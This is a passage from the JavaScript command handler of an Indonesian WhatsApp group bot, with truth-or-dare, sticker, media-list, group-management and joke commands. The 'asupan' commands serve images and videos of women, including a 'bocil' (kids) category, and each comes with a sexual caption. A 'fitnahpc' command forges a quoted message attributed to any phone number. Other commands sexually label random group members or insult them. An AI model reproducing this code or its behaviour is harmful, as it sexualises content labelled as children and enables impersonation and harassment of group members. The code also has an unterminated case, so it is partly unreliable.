        const trut =['Pernah suka sama siapa aja? berapa lama?','Kalau boleh atau kalau mau, di gc/luar gc siapa yang akan kamu jadikan sahabat?(boleh beda/sma jenis)','apa ketakutan terbesar kamu?','pernah suka sama orang dan merasa orang itu suka sama kamu juga?','Siapa nama mantan pacar teman mu yang pernah kamu sukai diam diam?','pernah gak nyuri uang nyokap atau bokap? Alesanya?','hal yang bikin seneng pas lu lagi sedih apa','pernah cinta bertepuk sebelah tangan? kalo pernah sama siapa? rasanya gimana brou?','pernah jadi selingkuhan orang?','hal yang paling ditakutin','siapa orang yang paling berpengaruh kepada kehidupanmu','hal membanggakan apa yang kamu dapatkan di tahun ini','siapa orang yang bisa membuatmu sange','siapa orang yang pernah buatmu sange','(bgi yg muslim) pernah ga solat seharian?','Siapa yang paling mendekati tipe pasangan idealmu di sini','suka mabar(main bareng)sama siapa?','pernah nolak orang? alasannya kenapa?','Sebutkan kejadian yang bikin kamu sakit hati yang masih di inget','pencapaian yang udah didapet apa aja ditahun ini?','kebiasaan terburuk lo pas di sekolah apa?']
		const ttrth = trut[Math.floor(Math.random() * trut.length)]
		truteh = await getBuffer(`https://www.linkpicture.com/q/images_72.png`)
	    but = [
          { buttonId: `${prefix}truth`, buttonText: { displayText: 'ᴛʀᴜᴛʜ' }, type: 1 },
          { buttonId: `${prefix}dare`, buttonText: { displayText: 'ᴅᴀʀᴇ' }, type: 1 }
        ]
        sendButLocation(from, ttrth, 'GK JALANIN WAJIB DONATE',truteh, but, {quoted: mek})
	        	break
		case 'dare':
		if (!isGroup) return reply('KhususGrup')
		const dare =['Kirim pesan ke mantan kamu dan bilang "aku masih suka sama kamu','telfon crush/pacar sekarang dan ss ke pemain','pap ke salah satu anggota grup','Bilang "KAMU CANTIK BANGET NGGAK BOHONG" ke cowo','ss recent call whatsapp','drop emot "😎??" setiap ngetik di gc/pc selama 1 hari','kirim voice note bilang can i call u baby?','drop kutipan lagu/quote, terus tag member yang cocok buat kutipan itu','pake foto sule sampe 3 hari','ketik pake bahasa daerah 24 jam','ganti nama menjadi "gue anak lucinta luna" selama 5 jam','chat ke kontak wa urutan sesuai %batre kamu, terus bilang ke dia "i lucky to hv you','prank chat mantan dan bilang " i love u, pgn balikan','record voice baca surah al-kautsar','bilang "i hv crush on you, mau jadi pacarku gak?" ke lawan jenis yang terakhir bgt kamu chat (serah di wa/tele), tunggu dia bales, kalo udah ss drop ke sini','sebutkan tipe pacar mu!','snap/post foto pacar/crush','teriak gajelas lalu kirim pake vn kesini','pap mukamu lalu kirim ke salah satu temanmu','kirim fotomu dengan caption, aku anak pungut','teriak pake kata kasar sambil vn trus kirim kesini','teriak " anjimm gabutt anjimmm " di depan rumah mu','ganti nama jadi " BOWO " selama 24 jam','Pura pura kerasukan, contoh : kerasukan maung, kerasukan belalang, kerasukan kulkas, dll']
		const der = dare[Math.floor(Math.random() * dare.length)]
		todz = await getBuffer(`https://www.linkpicture.com/q/images_72.png`)
	    but = [
          { buttonId: `${prefix}truth`, buttonText: { displayText: 'ᴛʀᴜᴛʜ' }, type: 1 },
          { buttonId: `${prefix}dare`, buttonText: { displayText: 'ᴅᴀʀᴇ' }, type: 1 }
        ]
        sendButLocation(from, der, 'GK JALANIN WAJIB DONATE',todz, but, {quoted: mek})
       	   break 
       case 'stickerwm':
					case 'swm':
						if (isMedia && !mek.message.videoMessage || isQuotedImage) {
							ppp = `${args.join(' ')}`
							const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
							const media = await pebz.downloadAndSaveMediaMessage(encmedia, `./sticker/${sender}`)
							const packname1 = ppp.split('|')[0]
							const author1 = ppp.split('|')[1]
							exif.create(packname1, author1, `stickwm_${sender}`)
							await ffmpeg(`${media}`)
									.input(media)
									.on('start', function (cmd) {
										console.log(`Started : ${cmd}`)
									})
									.on('error', function (err) {
										console.log(`Error : ${err}`)
										fs.unlinkSync(media)
										reply(mess.error.api)
									})
									.on('end', function () {
										console.log('Finish')
										exec(`webpmux -set exif ./sticker/stickwm_${sender}.exif ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {
											if (error) return reply(mess.error.api)
											pebz.sendMessage(from, fs.readFileSync(`./sticker/${sender}.webp`), sticker, {quoted: mek})
											fs.unlinkSync(media)	
											fs.unlinkSync(`./sticker/${sender}.webp`)	
											fs.unlinkSync(`./sticker/stickwm_${sender}.exif`)
										})
									})
									.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
									.toFormat('webp')
									.save(`./sticker/${sender}.webp`)
						} else if ((isMedia && mek.message.videoMessage.fileLength < 10000000 || isQuotedVideo && mek.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.fileLength < 10000000)) {
							wmsti = body.slice(11)
							if (!wmsti.includes('|')) return reply(`Kirim gambar atau reply gambar dengan caption *${prefix}stickerwm nama|author*`)
							const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
							const media = await pebz.downloadAndSaveMediaMessage(encmedia, `./sticker/${sender}`)
							const packname1 = wmsti.split('|')[0]
							const author1 = wmsti.split('|')[1]
							exif.create(packname1, author1, `stickwm_${sender}`)
							reply(mess.wait)
								await ffmpeg(`${media}`)
									.inputFormat(media.split('.')[4])
									.on('start', function (cmd) {
										console.log(`Started : ${cmd}`)
									})
									.on('error', function (err) {
										console.log(`Error : ${err}`)
										fs.unlinkSync(media)
										tipe = media.endsWith('.mp4') ? 'video' : 'gif'
										reply(mess.error.api)
									})
									.on('end', function () {
										console.log('Finish')
										exec(`webpmux -set exif ./sticker/stickwm_${sender}.exif ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {
											if (error) return reply(mess.error.api)
											pebz.sendMessage(from, fs.readFileSync(`./sticker/${sender}.webp`), sticker, {quoted: mek})
											fs.unlinkSync(media)
											fs.unlinkSync(`./sticker/${sender}.webp`)
											fs.unlinkSync(`./sticker/stickwm_${sender}.exif`)
										})
									})
									.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
									.toFormat('webp')
									.save(`./sticker/${sender}.webp`)
						} else {
							reply(`Kirim gambar/video dengan caption ${prefix}stickerwm nama|author atau tag gambar/video yang sudah dikirim\nNote : Durasi video maximal 10 detik`)
						}
						break
					case 'takestick':
					case 'take':
						if (!isQuotedSticker) return reply(`Reply sticker dengan caption *${prefix}takestick nama|author*`)
						ppp = `${args.join(' ')}`
						const encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
						const media = await pebz.downloadAndSaveMediaMessage(encmedia, `./sticker/${sender}`)
						const packname = ppp.split('|')[0]
						const author = ppp.split('|')[1]
						exif.create(packname, author, `takestick_${sender}`)
						exec(`webpmux -set exif ./sticker/takestick_${sender}.exif ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {
							if (error) return reply(mess.error.api)
							pebz.sendMessage(from, fs.readFileSync(`./sticker/${sender}.webp`), sticker, {quoted: mek})
							fs.unlinkSync(media)
							fs.unlinkSync(`./sticker/takestick_${sender}.exif`)
						})
						break
						case 'addsticker':
				if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
					if (!isQuotedSticker) return reply('Reply stiker')
					nm = body.slice(12)
					if (!nm) return reply('Nama sticker nya apa?')
					boij = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
					delb = await pebz.downloadMediaMessage(boij)
					setik.push(`${nm}`)
					fs.writeFileSync(`./media/sticker/${nm}.webp`, delb)
					fs.writeFileSync('./database/setik.json', JSON.stringify(setik))
					pebz.sendMessage(from, `Sukses, silahkan cek dengan *${prefix}liststicker*`, MessageType.text, { quoted: mek })
					break
				case 'delsticker':
				if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
					try {
					 nmm = body.slice(12)
					 wanu = setik.indexOf(nmm)
					 setik.splice(wanu, 1)
					 fs.unlinkSync(`./media/sticker/${nmm}.webp`)
					 reply(`Sukses menghapus sticker ${body.slice(12)}`)
					} catch (err){
						console.log(err)
						reply(mess.error.api)
					}
					break
				case 'stickerlist':
				case 'liststicker':
					teks = '*Sticker List :*\n\n'
					for (let awokwkwk of setik) {
						teks += `- ${awokwkwk}\n`
					}
					teks += `\n*Total : ${setik.length}*\n\n_Untuk mengambil sticker silahkan reply pesan ini dengan caption nama sticker_`
					pebz.sendMessage(from, teks.trim(), extendedText, { quoted: mek, contextInfo: { "mentionedJid": setik } })
					break
					case 'addvn':
					if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
					if (!isQuotedAudio) return reply('Reply audio')
					nm = body.slice(7)
					if (!nm) return reply('Nama vn nya apa?')
					boij = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
					delb = await pebz.downloadMediaMessage(boij)
					vien.push(`${nm}`)
					fs.writeFileSync(`./media/vn/${nm}.mp3`, delb)
					fs.writeFileSync('./database/vien.json', JSON.stringify(vien))
					pebz.sendMessage(from, `Sukses, silahkan cek dengan *${prefix}listvn*`, MessageType.text, { quoted: mek })
					break
					case 'delvn':
					if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
					try {
					 nmm = body.slice(7)
					 wanu = vien.indexOf(nmm)
					 vien.splice(wanu, 1)
					 fs.unlinkSync(`./media/vn/${nmm}.mp3`)
					reply(`Sukses menghapus vn ${body.slice(7)}`)
					} catch (err){
						console.log(err)
						reply(mess.error.api)
					}
					break
case 'listvn' :
reply('ciee mau nyolong Vn :v')
break
				case 'vnlisygt':
				case 'listyyyvn':
					teks = '*VN List :*\n\n'
					for (let awokwkwk of vien) {
						teks += `- ${awokwkwk}\n`
					}
					teks += `\n*Total : ${vien.length}*\n\n_Untuk mengambil vn silahkan reply pesan ini dengan caption nama vn_`
					pebz.sendMessage(from, teks.trim(), extendedText, { quoted: mek, contextInfo: { "mentionedJid": vien } })
					break
				case 'addimage':
				if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
					if (!isQuotedImage) return reply('Reply image')
					nm = body.slice(10)
					if (!nm) return reply('Nama image nya apa?')
					boij = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
					delb = await pebz.downloadMediaMessage(boij)
					imagi.push(`${nm}`)
					fs.writeFileSync(`./media/image/${nm}.jpg`, delb)
					fs.writeFileSync('./database/imagi.json', JSON.stringify(imagi))
					pebz.sendMessage(from, `Sukses, silahkan cek dengan *${prefix}listimage*`, MessageType.text, { quoted: mek })
					break
				case 'delimage':
				if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
					try {
					 nmm = body.slice(10)
					 wanu = imagi.indexOf(nmm)
					 imagi.splice(wanu, 1)
					 fs.unlinkSync(`./media/image/${nmm}.jpg`)
					 reply(`Sukses menghapus image ${body.slice(10)}`)
					} catch (err){
						console.log(err)
						reply(mess.error.api)
					}
					break
					case 'imagelist':
				case 'listimage':
					teks = '*Image List :*\n\n'
					for (let awokwkwk of imagi) {
						teks += `- ${awokwkwk}\n`
					}
					teks += `\n*Total : ${imagi.length}*\n\n_Untuk mengambil image silahkan reply pesan ini dengan caption nama image_`
					pebz.sendMessage(from, teks.trim(), extendedText, { quoted: mek, contextInfo: { "mentionedJid": imagi } })
					break
					case 'asupan':
 listMsg = {
 buttonText: 'LIST ASUPAN',
 footerText: '© KABANERI-BOT',
 description: `Hai kak @${sender.split('@')[0]}, Silahkan pilih menu asupannya disini, Gunakan Dengan Bijak :v`,
 sections: [
                     {
                      "title": `${jmn} - ${week} ${weton} - ${calender}`,
 rows: [
                          {
                              "title": "random",
                              "rowId": ""
                           },
                           {
                             "title": "cecanrandom",
                              "rowId": ""
                          },
                          {
                              "title": "cecanvietnam",
                              "rowId": ""
                           },
                           {
                              "title": "cecanmalaysia",
                              "rowId": ""
                           },
                           {
                              "title": "cecankorea",
                              "rowId": ""
                           },
                           {
                              "title": "cecanindonesia",
                              "rowId": ""
                           },
                           {
                              "title": "cecanjepang",
                              "rowId": ""
                           },
                           {
                             "title": "cecanthailand",
                              "rowId": ""
                          },
                          {
                              "title": "hijaber",
                              "rowId": ""
                           },
                           {
                              "title": "santuy",
                              "rowId": ""
                           },
                           {
                              "title": "ukhti",
                              "rowId": ""
                           },
                           {
                              "title": "bocil",
                              "rowId": ""
                           },
                           {
                              "title": "ghea",
                              "rowId": ""
                           },
                           {
                              "title": "rika",
                              "rowId": ""
                           },
                           {
                              "title": ".....",
                              "rowId": ""
                           }
                        ]
                     }],
 listType: 1
}
pebz.sendMessage(from, listMsg, MessageType.listMessage, {contextInfo: { mentionedJid: [sender]},quoted:fvid})
break
 //â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”[ BAHAN ASUPAN ]â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”//
 case 'cecanvietnam':
huft = await fetchJson(`https://zeroyt7-api.herokuapp.com/api/cewe/vietnam?apikey=${zerkey}`)
reply(mess.wait)
goo = await getBuffer(huft.result.url)
pebz.sendMessage(from, goo, image, {quoted: fvid, caption: 'Nih Jangan Lupa Subscribe Project pebz'})
break
case 'cecanrandom':
ini = await fetchJson(`https://zeroyt7-api.herokuapp.com/api/asupan/cecan?apikey=${zerkey}`)
reply(mess.wait)
buffer = await getBuffer(ini.result.url)
pebz.sendMessage(from, buffer, image, {quoted: fvid, caption: ''})
break
case 'hijaber':
ini = await fetchJson(`https://zeroyt7-api.herokuapp.com/api/asupan/hijaber?apikey=${zerkey}`)
reply(mess.wait)
buffer = await getBuffer(ini.result.url)
pebz.sendMessage(from, buffer, image, {quoted: fvid, caption: 'Nih Jangan Sampe Berdiri yah anunya (â‰§â–½â‰¦)'})
break
case 'santuy':
ini = await fetchJson(`https://zeroyt7-api.herokuapp.com/api/asupan/santuy?apikey=${zerkey}`)
reply(mess.wait)
buffer = await getBuffer(ini.result.url)
pebz.sendMessage(from, buffer, video, {quoted: fvid, caption: 'Nih Jangan Sampe Berdiri yah anunya (â‰§â–½â‰¦)'})
break
case 'ukhti':

ini = await fetchJson(`https://zeroyt7-api.herokuapp.com/api/asupan/ukty?apikey=${zerkey}`)
reply(mess.wait)
buffer = await getBuffer(ini.result.url)
pebz.sendMessage(from, buffer, video, {quoted: fvid, caption: 'Nih Jangan Sampe Berdiri yah anunya (â‰§â–½â‰¦)'})
break
case 'bocil':

ini = await fetchJson(`https://zeroyt7-api.herokuapp.com/api/asupan/bocil?apikey=${zerkey}`)
reply(mess.wait)
buffer = await getBuffer(ini.result.url)
pebz.sendMessage(from, buffer, video, {quoted: fvid, caption: 'Nih Jangan Sampe Berdiri yah anunya (â‰§â–½â‰¦)'})
break
case 'ghea':

ini = await fetchJson(`https://zeroyt7-api.herokuapp.com/api/asupan/ghea?apikey=${zerkey}`)
reply(mess.wait)
buffer = await getBuffer(ini.result.url)
pebz.sendMessage(from, buffer, video, {quoted: fvid, caption: 'Nih Jangan Sampe Berdiri yah anunya (â‰§â–½â‰¦)'})
break
case 'rika':

ini = await fetchJson(`https://zeroyt7-api.herokuapp.com/api/asupan/rikagusriani?apikey=${zerkey}`)
reply(mess.wait)
buffer = await getBuffer(ini.result.url)
pebz.sendMessage(from, buffer, video, {quoted: fvid, caption: 'Nih Jangan Sampe Berdiri yah anunya (â‰§â–½â‰¦)'})
break
//â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”[ FITUR CECAN ]â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”//
case 'cecanmalaysia':
huft = await fetchJson(`https://zeroyt7-api.herokuapp.com/api/cewe/malaysia?apikey=${zerkey}`)
reply(mess.wait)
goo = await getBuffer(huft.result.url)
pebz.sendMessage(from, goo, image, {quoted: fvid, caption: 'Nih Jangan Sampe Berdiri yah anunya (â‰§â–½â‰¦)'})
break
case 'cecankorea':

huft = await fetchJson(`https://zeroyt7-api.herokuapp.com/api/cewe/korea?apikey=${zerkey}`)
reply(mess.wait)
goo = await getBuffer(huft.result.url)
pebz.sendMessage(from, goo, image, {quoted: fvid, caption: 'Nih Jangan Sampe Berdiri yah anunya (â‰§â–½â‰¦)'})
break
case 'cecanindonesia':

huft = await fetchJson(`https://zeroyt7-api.herokuapp.com/api/cewe/indonesia?apikey=${zerkey}`)
reply(mess.wait)
goo = await getBuffer(huft.result.url)
pebz.sendMessage(from, goo, image, {quoted: fvid, caption: 'Nih Jangan Sampe Berdiri yah anunya (â‰§â–½â‰¦)'})
break
case 'cecanjapan':

huft = await fetchJson(`https://zeroyt7-api.herokuapp.com/api/cewe/japan?apikey=${zerkey}`)
reply(mess.wait)
goo = await getBuffer(huft.result.url)
pebz.sendMessage(from, goo, image, {quoted: fvid, caption: 'Nih Jangan Sampe Berdiri yah anunya (â‰§â–½â‰¦)'})
break
case 'cecanthailand':

huft = await fetchJson(`https://zeroyt7-api.herokuapp.com/api/cewe/thailand?apikey=${zerkey}`)
reply(mess.wait)
goo = await getBuffer(huft.result.url)
pebz.sendMessage(from, goo, image, {quoted: fvid, caption: 'Nih Jangan Sampe Berdiri yah anunya (â‰§â–½â‰¦)'})
break

case 'random':
if (!isGroup) return reply(mess.only.group)
reply(mess.wait)
kau = (`https://hardianto-chan.herokuapp.com/api/asupan?apikey=hardianto`)
kon = await getBuffer(kau)
pebz.sendMessage(from, kon, video, { quoted: mek, thumbnail: fs.readFileSync('./media/image/pebz.jpg')})
break

        case 'ngewe':
              ngewe = []
              ngew = groupMembers
              wek = ngew[Math.floor(Math.random() * ngew.length)]
              teks = `Tukang Ngewe di Geup ini Â» @${wek.jid.split('@')[0]} `
              ngewe.push(wek.jid)
              mentions(teks, ngewe, true)
              break
                  case 'jadian':
              jds = []
              jdii = groupMembers
              koss = groupMembers
              akuu = jdii[Math.floor(Math.random() * jdii.length)]
              diaa = koss[Math.floor(Math.random() * koss.length)]
              teks = `Ciee.. yang lagi jadian @${akuu.jid.split('@')[0]}  (â™¥ï¸ ) @${diaa.jid.split('@')[0]} `
              jds.push(akuu.jid)
              jds.push(diaa.jid)
              mentions(teks, jds, true)
              break
case "caklontong":
   anu = await fetchJson(`https://rest-api-megumin1.herokuapp.com/api/kuis/caklontong?apikey=beta`)
   cak = `*${anu.result.soal}*`
   setTimeout( () => {
   reply('*âž¸ Jawaban :* '+anu.result.jawaban, text, {quoted: mek}) // ur cods
   }, 30000) // 1000 = 1s,
   setTimeout( () => {
   reply('_10 Detik lagiâ€¦_', text) // ur cods
   }, 20000) // 1000 = 1s,
   setTimeout( () => {
   reply('_20 Detik lagi_â€¦', text) // ur cods
   }, 10000) // 1000 = 1s,
   setTimeout( () => {
   reply('_30 Detik lagi_â€¦', text) // ur cods
   }, 2500) // 1000 = 1s,
   setTimeout( () => {
   pebz.sendMessage(from, cak, text, {quoted: mek }) // ur cods
   }, 0) // 1000 = 1s,
   break
   case 'artimimpi':
				if (args.length < 1) return reply('Teksnya?')
anu = await fetchJson(`https://bx-hunter.herokuapp.com/api/artimimpi?q=${body.slice(11)}&apikey=${HunterApi}`, {method: 'get'})
teks = anu.result
reply(teks)
break
case 'fitnahpc':
   if (args.length < 1) return reply(`Usage :\n${prefix}fitnahpc [nomor|pesan|balasanbot]]\n\nEx : \n${prefix}fitnahpc 0|hai|hai juga markenlin`)
   var gh = body.slice(10)
   var parti = gh.split("|")[0];
   var targetq = gh.split("|")[1];
var bot = gh.split("|")[2];
pebz.sendMessage(from, `${bot}`, text, {quoted: { key: { fromMe: false, participant: `${parti}@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { conversation: `${targetq}` }}})
  break
  case 'hbd': case 'zodiak': case 'zodiac':
let textus = args.join(" ")
if (!c) return reply(`Cara Pakeknya\nTahun, Bulan, Tanggal\n\n*Contoh : ${prefix + command} 2003 01 24*`)
const zodiak = [
    ["Capricorn",   new Date(1970, 0, 1)],
    ["Aquarius",    new Date(1970, 0, 20)],
    ["Pisces",      new Date(1970, 1, 19)],
    ["Aries",       new Date(1970, 2, 21)],
    ["Taurus",      new Date(1970, 3, 21)],
    ["Gemini",      new Date(1970, 4, 21)],
    ["Cancer",      new Date(1970, 5, 22)],
    ["Leo",         new Date(1970, 6, 23)],
    ["Virgo",       new Date(1970, 7, 23)],
    ["Libra",       new Date(1970, 8, 23)],
    ["Scorpio",     new Date(1970, 9, 23)],
    ["Sagittarius", new Date(1970, 10, 22)],
    ["Capricorn",   new Date(1970, 11, 22)]
].reverse()

function getZodiac(month, day) {
let d = new Date(1970, month - 1, day)
return zodiak.find(([_,_d]) => d >= _d)[0]
}
const date = new Date(textus)
if (date == 'âŽ Kesalahan, Pastikan Format sudah Benar..!!! âŽ') throw date
const d = new Date()
const [tahun, bulan, tanggal] = [d.getFullYear(), d.getMonth() + 1, d.getDate()]
const birth = [date.getFullYear(), date.getMonth() + 1, date.getDate()]
    
const zodiac = getZodiac(birth[1], birth[2])
const ageD = new Date(d - date)
const age = ageD.getFullYear() - new Date(1970, 0, 1).getFullYear()

const birthday = [tahun + (birth[1] < bulan), ...birth.slice(1)]
const cekusia = bulan === birth[1] && tanggal === birth[2] ? `Happy -${age}th Birthday ðŸ¥³ðŸŽ‰` : age

const teksh = `*Data Kelahiranmu*\n
Kelahiran : ${birth.join('-')}
Next HBD  : ${birthday.join('-')}
Umur      : ${cekusia}
Zodiak    : ${zodiac}
`.trim()
reply(teksh)
break
case 'pintarcek':
       case 'cekpintar':
              if (!isGroup) return reply(mess.only.group)
              pintar = body.slice(1)
              const pin =['Lumayan','Pinter banget dah jadi syangg:v','Goblog lu jarang belajar yaahhh','Kautuh Bodoh gak usah di cek Kontol']
              const tar = pin[Math.floor(Math.random() * pin.length)]
              pebz.sendMessage(from, '*Pertanyaan :* '+pintar+'\n*Jawaban :* '+ tar+'', text, { quoted: mek })
              break
case 'gantengcek':
       case 'cekganteng':
              if (!isGroup) return reply(mess.only.group)
              ganteng = body.slice(1)
              const gan =['10','30','20','40','50','60','70','62','74','83','97','100','29','94','75','82','41','39']
              const teng = gan[Math.floor(Math.random() * gan.length)]
              pebz.sendMessage(from, '*Pertanyaan :* '+ganteng+'\n*Jawaban :* '+ teng+'%', text, { quoted: mek })
              break
case 'cantikcek':
       case 'cekcantik':
              if (!isGroup) return reply(mess.only.group)
              cantik = body.slice(1)
              const can =['10','30','20','40','50','60','70','62','74','83','97','100','29','94','75','82','41','39']
              const tik = can[Math.floor(Math.random() * can.length)]
              pebz.sendMessage(from, '*Pertanyaan :* '+cantik+'\n*Jawaban :* '+ tik+'%', text, { quoted: mek })
              break
case 'cekmati':
              if (!isGroup) return reply(mess.only.group)
              if (args.length < 1) return reply('Tag yang mau di Cek Kematian nya.! ')
              predea = await axios.get(`https://api.agify.io/?name=${c}`)
              reply(`Nama : ${predea.data.name}\n*Mati Pada Umur :* ${predea.data.age} Tahun.\n\n_Cepet Cepet Tobat Bro Soalnya Mati ga ada yang tau_`)
              break
case 'add':
   if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins) return reply(mess.only.admin)
if (!isBotGroupAdmins) return reply(mess.only.Badmin)
   if (args.length < 1) return reply('Yang mau di add jin ya? contoh .add 628...')
   if (args[0].startsWith('08')) return reply('Gunakan kode negara mas contoh : 628..')
   try {
      num = `${args[0].replace(/ /g, '')}@s.whatsapp.net`
      pebz.groupAdd(from, [num])
   } catch (e) {
      console.log('Error :', e)
      reply('Gagal menambahkan target, mungkin karena di private')
   }
   break
case 'kick':
   if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins) return reply(mess.only.admin)

   if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Tag target yang ingin di tendang! contoh : @namatarget')
   mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
   if (mentioned.length > 1) {
      teks = 'Perintah di terima, mengeluarkan :\n'
      for (let _ of mentioned) {
         teks += `@${_.split('@')[0]}\n`
      }
      mentions(teks, mentioned, true)
      pebz.groupRemove(from, mentioned)
   } else {
      mentions(`Perintah di terima, mengeluarkan : @${mentioned[0].split('@')[0]}`, mentioned, true)
      pebz.groupRemove(from, mentioned)
   }    
             case 'joinn':
             if (isGroup && !itsMe) return reply('Fitur Hanya dapat digunakan dalam Private Chat!')
             if (args.length < 1) return reply(`Kirim perintah *${prefix}join* link grup`)
             if (!isUrl(args[0]) && !args[0].includes('chat.whatsapp.com')) return reply(mess.error.Iv)
             let code = args[0].replace('https://chat.whatsapp.com/', '')
             pebz.acceptInvite(code)
              .then((res) => reply(jsonformat(res)))
             .catch((err) => reply(jsonformat(err)))
             break
                   case 'join': 
                          if (args.length == 0) return reply(`Ex:- ${prefix}join https://chat.whatsapp.com`)
                          if (!c) return reply('*The link?*')
                          
                          if (!isUrl(args[0]) && !args[0].includes('https://chat.whatsapp.com/')) return reply('*The link is invalid Tod*')
                          link = args[0].replace('https://chat.whatsapp.com/','')
                          fak = pebz.query({ json: ['action', 'invite', link],
                          expect200: true })
                          reply('*Successfully Entered Group*')
                          break
                         case 'totag':
                      if (!isGroup) return reply(mess.only.group)
                      if ((isMedia && !mek.message.videoMessage || isQuotedSticker) && args.length == 0) {
                         encmediau = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
                         file = await pebz.downloadAndSaveMediaMessage(encmediau, filename = getRandom())
                         value = args.join(" ")
                         var group = await pebz.groupMetadata(from)
                         var member = group['participants']
                         var mem = []
                         member.map(async adm => {
                         mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
                         })
                         var options = {
                             contextInfo: { mentionedJid: mem },
                             quoted: mek
                         }
                         ini_buffer = fs.readFileSync(file)
                         pebz.sendMessage(from, ini_buffer, sticker, options)
                         fs.unlinkSync(file)
                         } else if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
                         encmediau = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
                         file = await pebz.downloadAndSaveMediaMessage(encmediau, filename = getRandom())
                         value = args.join(" ")
                         var group = await pebz.groupMetadata(from)
                         var member = group['participants']
                         var mem = []
                         member.map(async adm => {
                         mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
                         })
                         var options = {
                             contextInfo: { mentionedJid: mem },
                             quoted: mek
                         }
                         ini_buffer = fs.readFileSync(file)
                         pebz.sendMessage(from, ini_buffer, image, options)
                         fs.unlinkSync(file)
                     } else if ((isMedia && !mek.message.videoMessage || isQuotedAudio) && args.length == 0) {
                         encmediau = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
                         file = await pebz.downloadAndSaveMediaMessage(encmediau, filename = getRandom())
                         value = args.join(" ")
                         var group = await pebz.groupMetadata(from)
                         var member = group['participants']
                         var mem = []
                         member.map(async adm => {
                         mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
                         })
                         var options = {
                             mimetype : 'audio/mp4', duration: 234,
                             ptt : true,
                             contextInfo: { mentionedJid: mem },
                             quoted: mek
                         }
                         ini_buffer = fs.readFileSync(file)
                         pebz.sendMessage(from, ini_buffer, audio, options)
                         fs.unlinkSync(file)
                      } else if ((isMedia && !mek.message.videoMessage || isQuotedVideo) && args.length == 0) {
                         encmediau = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
                         file = await pebz.downloadAndSaveMediaMessage(encmediau, filename = getRandom())
                         value = args.join(" ")
                         var group = await pebz.groupMetadata(from)
                         var member = group['participants']
                         var mem = []
                         member.map(async adm => {
                         mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
                         })
                         var options = {
                             mimetype : 'video/gif',
                             contextInfo: { mentionedJid: mem },
                             quoted: mek
                         }
                         ini_buffer = fs.readFileSync(file)
                         pebz.sendMessage(from, ini_buffer, video, options)
                         fs.unlinkSync(file)
                     } else if ((isMedia && !mek.message.videoMessage || isQuotedDocument) && args.length == 0) {
                         encmediau = isQuotedDocument ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
                         file = await pebz.downloadAndSaveMediaMessage(encmediau, filename = getRandom())
                         value = args.join(" ")
                         var group = await pebz.groupMetadata(from)
                         var member = group['participants']
                         var mem = []
                         member.map(async adm => {
                         mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
                         })
                         var options = {
                             mimetype : 'text/plain',
                             contextInfo: { mentionedJid: mem },
                             quoted: mek
                         }
                         ini_buffer = fs.readFileSync(file)
                         pebz.sendMessage(from, ini_buffer, document, options)
                         fs.unlinkSync(file)
                     }  else if ((isMedia && !mek.message.videoMessage || isQuotedVideo) && args.length == 0) {
                         encmediau = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
                         file = await pebz.downloadAndSaveMediaMessage(encmediau, filename = getRandom())
                         value = args.join(" ")
                         var group = await pebz.groupMetadata(from)
                         var member = group['participants']
                         var mem = []
                         member.map(async adm => {
                         mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
                         })
                         var options = {
                             mimetype : 'video/mp4', duration: 234,
                             contextInfo: { mentionedJid: mem },
